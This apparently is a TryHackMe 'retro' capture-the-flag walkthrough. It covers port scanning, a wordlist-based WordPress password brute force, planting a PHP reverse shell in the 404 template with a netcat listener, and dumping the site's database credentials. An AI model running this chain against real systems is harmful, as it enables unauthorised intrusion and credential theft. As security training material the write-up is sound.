
Start with `rustscan`

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.117.53:80
Open 10.10.117.53:3389
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 09:23 EDT
Initiating Ping Scan at 09:23
Scanning 10.10.117.53 [2 ports]
Completed Ping Scan at 09:23, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:23
Completed Parallel DNS resolution of 1 host. at 09:23, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:23
Scanning 10.10.117.53 [2 ports]
Discovered open port 3389/tcp on 10.10.117.53
Discovered open port 80/tcp on 10.10.117.53
Completed Connect Scan at 09:23, 0.25s elapsed (2 total ports)
Nmap scan report for 10.10.117.53
Host is up, received syn-ack (0.25s latency).
Scanned at 2023-07-22 09:23:38 EDT for 0s

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
3389/tcp open  ms-wbt-server syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds


┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$
```


`nmap`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 09:23 EDT
Nmap scan report for 10.10.117.53
Host is up (0.25s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2023-07-22T13:46:55+00:00
|_ssl-date: 2023-07-22T13:47:00+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2023-07-21T13:21:32
|_Not valid after:  2024-01-20T13:21:32
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1421.25 seconds
```

Generate a wordlist
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$ cewl http://$IP/retro -w retro_wordlist.txt -d 3
```

bruteforce password for `wade` user

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$ wpscan --url $IP/retro -U wade -P retro_wordlist.txt
```


```sh
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - wade / parzival
Trying wade / parzival Time: 00:03:28 <=============                           > (430 / 1284) 33.48%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: wade, Password: parzival
```

```
 Username: wade, Password: parzival
```

wp plugin
```
WordPress 5.2.1 running 90s Retro theme.


Relative URL
Deactivate
	

Relative URL applies wp_make_link_relative function to links (posts, categories, pages and etc.) to convert them to relative URLs. Useful for developers when debugging local WordPress instance on a mobile device (iPad. iPhone, etc.).
Version 0.1.7 | By Tunghsiao Liu | View details


	
Make Paths Relative
About | Contact | Settings | Deactivate
	

This plugin converts the URL(Links) to relative instead of absolute.
Version 1.1.2 | By YAS Global Team | View details
```




I got shell after edit `404 page`. Follow this guide
https://www.golinuxcloud.com/set-up-wordpress-reverse-shell/

Payload:
https://github.com/ivan-sincek/php-reverse-shell/tree/master

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/retro]
└─$ rlwrap -cAr nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.11.29.109] from (UNKNOWN) [10.10.117.53] 51073
SOCKET: Shell has connected!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\retro>
```

Wordpress DB:
```sh
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress567');

/** MySQL database username */
define('DB_USER', 'wordpressuser567');

/** MySQL database password */
define('DB_PASSWORD', 'YSPgW[%C.mQE');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```
OS info
```
Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
```
